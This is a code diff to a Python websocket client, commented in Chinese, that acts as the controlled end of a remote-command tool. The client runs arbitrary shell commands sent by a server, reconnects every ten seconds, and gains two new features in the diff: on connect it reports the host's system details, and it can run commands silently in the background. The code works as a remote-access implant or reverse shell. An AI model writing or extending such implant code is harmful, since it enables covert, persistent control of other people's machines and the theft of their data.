@@ -1,6 +1,7 @@
 import asyncio
 import websockets
 import subprocess
+import platform
 import ssl
 import json
 import os
@@ -10,12 +11,26 @@ from sys import exit
 # HOST: 要连接的服务器IP地址
 # PORT: 要连接的服务器端口号
 HOST = '127.0.0.1' 
-PORT = 8765 
+PORT = 8765
 
+# --- 获取系统信息 ---
+
+def get_systeminfo():
+    """获取系统详细信息"""
+    system = platform.system()
+    node = platform.node()
+    release = platform.release()
+    version = platform.version()
+    machine = platform.machine()
+    processor = platform.processor()
+    systeminfo = f"{system} {node} {release} {version} {machine} {processor}"
+    return systeminfo
+    
 # --- 被控端逻辑 ---
 class Execute_command:
     """命令执行类，用于在本地执行系统命令"""
     def execute_command(self, command):
+        """执行系统命令并返回结果"""
         try:
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             stdout = result.stdout
@@ -35,11 +50,20 @@ class Execute_command:
             }
 
     def change_directory(self, directory):
+        """切换工作目录"""
         try:
             os.chdir(directory)
             return "[bold green]切换工作目录成功[/bold green]"
         except Exception as e:
             return "[bold red]切换工作目录失败[/bold red]: " + str(e)
+    
+    def background(self, command):
+        """在后台执行命令"""
+        try:
+            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return "[bold green]命令已在后台运行[/bold green]"
+        except Exception as e:
+            return "[bold red]后台运行命令失败[/bold red]: " + str(e)
 
 # --- 客户端逻辑 ---
 async def client_loop():
@@ -58,6 +82,8 @@ async def client_loop():
             # 尝试连接到服务器
             async with websockets.connect(f'wss://{HOST}:{PORT}', ssl=ssl_context, ping_interval=10) as websocket:
                 execute_command = Execute_command()
+                # 发送系统信息
+                await websocket.send(get_systeminfo())
                 # 持续接收并处理服务器发送的命令
                 async for command in websocket:
                     match command:
@@ -68,8 +94,11 @@ async def client_loop():
                         case command if command.startswith("cd:"):
                             # 切换工作目录
                             await websocket.send(execute_command.change_directory(command[3:]))
+                        case command if command.startswith("background:"):
+                            # 在后台运行命令
+                            await websocket.send(execute_command.background(command[11:]))
 
-        except Exception as e:
+        except Exception:
             # 发生异常时等待10秒后重试
             await asyncio.sleep(10)
         except KeyboardInterrupt:
